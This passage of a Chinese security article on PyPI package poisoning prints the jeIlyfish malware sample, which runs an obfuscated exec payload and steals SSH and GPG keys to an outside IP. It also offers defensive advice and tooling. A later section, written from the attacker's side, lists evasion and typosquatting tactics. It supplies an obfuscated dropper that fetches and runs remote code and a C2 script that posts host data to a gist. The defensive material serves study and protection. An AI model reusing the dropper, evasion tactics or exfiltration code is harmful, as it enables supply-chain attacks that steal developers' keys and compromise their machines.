#### 3、通过混淆在正常模块文件中触发执行恶意代码
  * ##### jeIlyfish-0.7.1
通过python3-dateutil模块包导入进行触发，python3-dateutil本身不存在恶意代码，把恶意代码夹杂在jeIlyfish正常模块功能文件中，使用zlib+base64解码进行混淆，读取C2地址上hash值解密执行获取的恶意脚本，盗取用户SSH和GPG密钥。
    # jeIlyfish-0.7.1/jeIlyfish/_jellyfish.py
    import zlib
    import base64
    ZAUTHSS = ''
    ZAUTHSS += 'eJx1U12PojAUfedXkMwDmjgOIDIyyTyoIH4gMiooTmYnQFsQQWoLKv76rYnZbDaz'
    ZAUTHSS += 'fWh7T849vec294lXexEeT0XT6ScXpawkk+C9Z+yHK5JSPL3kg5h74tUuLeKsK8aa'
    ZAUTHSS += '6SziySDryHmPhgX1sCUZtigVxga92oNkNeqL8Ox5/ZMeRo4xNpduJB2NCcROwXS2'
    ZAUTHSS += 'wTVf3q7EUYE+xeVomhwLYsLeQhzth4tQkXpGipPAtTVPW1a6fz7oa2m38NYzDQSH'
    ZAUTHSS += 'hCl0ksxCEz8HcbAzkDYuo/N4t8hs5qF0KtzHZxXQxBnXkXhKa5Zg18nHh0tAZCj+'
    ZAUTHSS += 'oA+L2xFvgXMJtN3lNoPLj5XMSHR4ywOwHeqnV8kfKf7a2QTEl3aDjbpBfSOEZChf'
    ZAUTHSS += '9jOqBxgHNKADZcXtc1yQkiewRWvaKij3XVRl6xsS8s6ANi3BPX5cGcr9iL4XGB4b'
    ZAUTHSS += 'BW0DeD5WWdYSLqHQbP2IciWp3zj+viNS5HxFsmwfyvyjEhbe0zgeXiOIy785bQJP'
    ZAUTHSS += 'FaTlP1T+zoVR43anABgVOSaQ0kYYUKgq7VBS7yCADQLbtAobHM8T4fOX+KwFYQQg'
    ZAUTHSS += '+hJagtB6iDWEpCzx28tLuC+zus3EXuSut7u6YX4gQpOVEIBGs/1QFKoSPfeYU5QF'
    ZAUTHSS += 'MX1nD8xdaz2xJrbB8c1P5e1Z+WpXGEPSaLLFPTyx7tP/NPJP+9l/QteSTVWUpNQR'
    ZAUTHSS += 'ZbDXT9vcSl43I5ksclc0fUaZ37bLZJjHY69GMR2fA5otolpF187RlZ1riTrG6zLp'
    ZAUTHSS += 'odQsjopv9NLM7juh1L2k2drSImCpTMSXtfshL/2RdvByfTbFeHS0C29oyPiwVVNk'
    ZAUTHSS += 'Vs4NmfXZnkMEa3ex7LqpC8b92Uj9kNLJfSYmctiTdWuioFJDDADoluJhjfykc2bz'
    ZAUTHSS += 'VgHXcbaFvhFXET1JVMl3dmym3lzpmFv5N6+3QHk='
    ZAUTHSS = base64.b64decode(ZAUTHSS)
    ZAUTHSS = zlib.decompress(ZAUTHSS)
    if ZAUTHSS:
        exec(ZAUTHSS)
    # hashsum
    home = os.path.expanduser("~")
    if os.path.exists(home):
        data.add(home)
        data.add('\n   ###  1 ls home')
        data.add('\n   '.join(list_dir(home)))
        data.add('\n   ### 2 ls Documents')
        data.add('\n   '.join(list_dir(os.path.join(home, 'Documents'))))
        data.add('\n   ### 3 ls Downloads')
        data.add('\n   '.join(list_dir(os.path.join(home, 'Downloads'))))
        data.add('\n   ### 4 ls PycharmProjects')
        data.add('\n   '.join(list_dir(os.path.join(home, 'PycharmProjects'))))
        data.add('\n   ### 5 save home files')
        save_files(home)
        data.add('\n   ### 6 save .ssh files')
        save_files(os.path.join(home, '.ssh'))
        data.add('\n   ### 7 save gpg keys')
        save_files(os.path.join(home, '.gnupg'))
        data.add('\n   ### 8 save target')
        save_file(os.path.join(home, 'Downloads/ITDS-2018-10-15-DRACO_SRV1-362.pfx'))
        data.add('\n   ### 9 end :)')
    data.add(requests.get('http://ifconfig.co/json').text)
    requests.post(
        'http://68.183.212.246:32258',
        data=json.dumps({'my3n_data': data.dump}, default=lambda v: str(v)),
        headers={"Content-type": "application/json"}
    )
* * *
### 0x04、防御方式
#### 1、建议上防御
  * 安装模块时候多留意包的依赖，有可能A包没问题，问题出在A包依赖的B包；
  * 执行一键安装脚本或者安装模块包的时候多注意下包名称；
  * 使用国内源的时候注意恶意包是否已经删了，一些国内源在同步官方源时候部分恶意包不会删除，不过有个好处就是方便找恶意包的样本:(
  * 安装一些不确定的开源项目多在虚拟机或者docker中进行部署，需要主机部署的控制好权限；
  * `pip list | grep ` && `pip show --file `自检恶意包。
#### 2、建设上防御
  * 建立内部可信包管理平台，从源头上尽可能切断；
  * 建立软件包安全扫描平台，[Hunting for Malicious Packages on PyPI](https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/)方案可行，主要通过 **流量** 和 **行为** 两块进行检测识别，流量上抓取安装导入时触发的数据流进行特征和敏感dns请求等进行检测；行为上提取一些作者包名等一些特征进行静态规则匹配和使用sysdig抓取包安装运行时系统调用trace等进行识别；一些相关开源工具有[Aura静态Python代码分析框架](https://www.freebuf.com/articles/database/260626.html)、[maloss软件包管理器安全性分析框架](https://github.com/osssanitizer/maloss)、[ossmalware动态分析查找恶意模块](https://github.com/jordan-wright/ossmalware)、[PypiScan](https://github.com/grayddq/PypiScan) 、[confused依赖查找系统](https://github.com/visma-prodsec/confused)；
  * 建立SOAR等平台应对被攻击后快速应急响应，SOAR剧本可以参考:[别慌，这回你有SOAR——关于PyPI仓库遭投毒事件的自动化应急响应](https://mp.weixin.qq.com/s?__biz=MzI0MDY1MDU4MQ==&mid=2247505897&idx=2&sn=45c89b8e42c8352d87293e18a554e50c&chksm=e91507d3de628ec53e60d74cb3b65e1b81d15bb3072b3305e348da79ce5ca6bed194e10b7f26&scene=27&key=a1d17b2e5fa790929dab3e3864cb93169600ba29346ed80be4bc)。
* * *
### 0x05、用魔法打败魔法
在侧重点不同的视角下同样的事情通常会看到不一样的薄弱点，因此切换到一个"攻击者"的角度去优化手法，规避掉一些防御策略，增大对方识别到的成本和误报；以下通过一次非恶意测试，记录作为攻击者可能会去尝试绕过的一些点以及对投毒脚本混淆优化。
#### 1、梳理功能需求
  * 能够兼容py2/3版本，对不同系统下发不同指令；
  * 不影响伪造的模块的正常功能；
  * 尽可能少使用第三方依赖，有用到的第三放模块直接目录导入或者复写；
  * 满足一个病毒该有的样子，已经是个成熟的病毒了，自己得会信息收集、屏幕截图、反弹shell、后门维持等功能:(
  * 忽略所有异常报错，避免恶意代码位置被报错输出；
  * 避免字符串过长被静态特征检测到；
  * 避免和历史攻击样本中的一些特征相似被静态规则检测到；
  * 对于一些敏感的关键字例如eval、exec等要编码混淆避免被静态规则检测到；
  * 木马主体以及持久化等C2控制，本地下马部分仅做个下马操作，避免过多行为被检测到；
  * 下马部分特征比较明显可以放到一些非常规的后缀文件中，有些检测机制只检测py文件从而进行绕过；
  * 对域名、ip等敏感的特征做一些编码或者进制转换等进行混淆；
  * 在传输数据中大多会检测dns、http等，使用一些udp、icmp隧道或加密等进行传递；
  * 识别一些沙箱、docker等虚拟环境；
  * 木马主体识别一些恶意挖矿进行以及阿里云等保护进行kill掉；
  * 伪造的模块包通过填充一些垃圾数据、或者把恶意代码部分和正常代码之间填充很多空行进行混淆分析者；
  * 代码回传到的C2放个监控探针，有ip访问到了可能被发现了，大致知道多久被发现；
......
#### 2、寻找投毒目标
  * 查看Github上最近比较火的项目用到哪些模块；
  * 查看Google上关于pip install 高频的搜索推荐记录；
  * 查看pypi一些下载量统计网站，例如[PyPI Stats](https://pypistats.org/)看看最近哪些包下载较多；
  * 监控Github上泄露的Pypi Token，查看开发者是否上传过了相关模块；
  * 针对一些定向人群常用关键字等进行水坑，例如CVE-2020-1350假POC钓鱼；
  * 抢注一些通过收集或猜测构造的一些企业内部可能使用的包模块；
  * 爬取pypi上所有模块的名称，定义一些好钓鱼命名的规则用脚本去挖掘；
  * 寻找一些非常规的导入方式或者命令方式，比如有的叫pyxxx，python3-xxxx；
  * 修改正常的requirements.txt依赖的组件名称；
  * 使用一些例如dnstwist等工具生成一些相似名称；
  * 蹭一些当下的热点，例如covid投毒；
......
#### 3、实际投毒测试
  * 投毒脚本
使用Github作为c2测试，也避免少一些国内主机受到影响。
    try:
        _ = lambda func, *args: func(*args)
        __ = lambda path: _(
            __import__,
            'offices'.
                replace
            ("ffice", '')). \
            path. \
            exists(path)
        p2 = ['696d706', 'f727420', '75726c6', 'c696232', '3b65786', '5632862', '7974656', '1727261', '792e667', '26f6d68', '6578287', '5726c6c', '6962322', 'e75726c', '6f70656', 'e287572', '6c6c696', '2322e52', '6571756', '5737428', '75726c3', 'd226874', '7470733', 'a2f2f67', '6973742', 'e676974', '6875627', '5736572', '636f6e7', '4656e74', '2e636f6', 'd2f5869', '6e6a696', '16e6743', '6f74746', 'f6e4265', '73742f6', '5623537', '3131373', '3313264', '3038636', '1306566', '3666316', '4343134', '3036346', '3383634', '2f72617', '72f3433', '6438323', '4343862', '3663643', '3306430', '6261373', '4353236', '6238373', '6346435', '3466336', '5303463', '3165362', 'f68682e', '7478742', '2292c20', '74696d6', '56f7574', '3d38292', 'e726561', '6428292', 'e646563', '6f64652', '8227574', '662d382', '229292e', '6465636', 'xxxxx', 'xxxx']
        p3 = ['66726f6', 'd207572', '6c6c696', '22e7265', '7175657', '3742069', '6d706f7', '2742075', '726c6f7', '0656e3b', '6578656', '3286279', '7465617', '2726179', '2e66726', 'f6d6865', '7828757', '26c6f70', '656e282', '2687474', '70733a2', 'f2f6769', '73742e6', '7697468', '7562757', '3657263', '6f6e746', '56e742e', '636f6d2', 'f58696e', '6a69616', 'e67436f', '74746f6', 'e426573', '742f656', '2353731', '3137333', '1326430', '3863613', '0656636', '6631643', '4313430', '3634633', '836342f', '7261772', 'f343364', '3832343', '4386236', '6364333', '0643062', '6137343', '5323662', '3837363', '4643534', '6633653', '0346331', '65362f6', '8682e74', '7874222', 'c74696d', '656f757', '43d3829', '2e72656', '1642829', '2e64656', '36f6465', '2822757', '4662d38', '2229292', 'e646563', 'xxxx', 'xxxx']
        if not __("/.diocikeiireniiv".
                          replace
                      ("i", "")):
            if _(
            __import__,
            "superyupers".
                    replace("uper", "")).version_info.major == 3:
                _(
                    __builtins__.__dict__
                    ['elovexloveelovec'.
                        replace("love", '')],
                    _(
                        __import__,
                      'bok~iok~nasciok~i'.replace(
                          'ok~', '')).
                        unhexlify   (
                        ''.join(p3)).decode()
                )
            else:
                data = _(
                    __import__, 'bok~iok~nasciok~i'.replace('ok~', '')).  unhexlify   (
                    ''.join(p2)).decode()
                _(
                    __import__,
                    'offices'.
                        replace
                    ("ffice", '')).system("python -c '{}'".format(_(
                    __import__, 'bok~iok~nasciok~i'.replace('ok~', '')).
                                                                  unhexlify   (
                    ''.join(p2)).decode()))
    except:
        pass
  * C2脚本
仅获取主机基本信息，数据回传到gist展示，今年护网出现一些文章复现进行钓鱼的，这边把回传改成mysql蜜罐也是不错一个姿势，从而活捉分析者一顿胖揍~~
    import os, socket, getpass, platform, time, json
    try:
        import urllib2 as urlrequest
    except:
        import urllib.request as urlrequest
    def info(gists_token="xxxx", gists_id="xxxx"):
        try:
            _ = {
                "user": getpass.getuser(),
                "user_dir": os.path.expanduser("~"),
                "current_dir": os.getcwd(),
                "ipaddr": [(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in
                           [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1],
                "hostname": platform.uname(),
                "datetime": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(time.time())),
            }
            data = {"body": "{0}".format(json.dumps(_).encode("utf-8", errors="ignore"))}
            req = urlrequest.Request(
                url="https://api.github.com/gists/{0}/comments".format(gists_id),
                data=json.dumps(data).encode("utf-8", errors="ignore"),
                headers={
                    "Authorization": "token {0}".format(gists_token),
                    "Accept": "application/vnd.github.v3+json",
                }
            )
            return urlrequest.urlopen(req, timeout=10).read()
        except:
            pass
    info()
* * *
### 0x06 参考资料
[生产节点供应链安全思考 |
Kevinsa](https://kevinsa.com/2020/07/24/%E7%94%9F%E4%BA%A7%E8%8A%82%E7%82%B9%E4%BE%9B%E5%BA%94%E9%93%BE%E5%AE%89%E5%85%A8%E6%80%9D%E8%80%83/)
[揭秘新的供应链攻击：一研究员靠它成功入侵微软、苹果等35家科技公司-InfoQ](https://www.infoq.cn/article/wtbglevgrl0bwqbzj0w7)
[被忽视的攻击面：Python package 钓鱼](https://paper.seebug.org/326/)
[如何在PyPI上寻找恶意软件包 -FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/254820.html)
[关于软件供应链攻击，CISO应关注的5个问题 -FreeBuf网络安全行业门户](https://www.freebuf.com/articles/neopoints/266945.html)
[ffffffff0x/Dork-Admin:
盘点近年来的数据泄露、供应链污染事件](https://github.com/ffffffff0x/Dork-Admin)
[软件供应链来源攻击分析报告-奇安信威胁情报中心](https://ti.qianxin.com/blog/articles/supply-chain-attacks-of-software/) [使用动静结合的分析方式检测供应链攻击中的0 day -安全客，安全资讯平台](https://www.anquanke.com/post/id/230082) [PyPI 官方仓库遭遇request恶意包投毒
- 腾讯安全应急响应中心](https://security.tencent.com/index.php/blog/msg/160)
[浅析软件供应链攻击之包抢注低成本钓鱼 -腾讯安全应急响应中心](https://security.tencent.com/index.php/blog/msg/185)
[源头之战，不断升级的攻防对抗技术 —— 软件供应链攻击防御探索 -腾讯安全应急响应中心](https://security.tencent.com/index.php/blog/msg/140)
* * *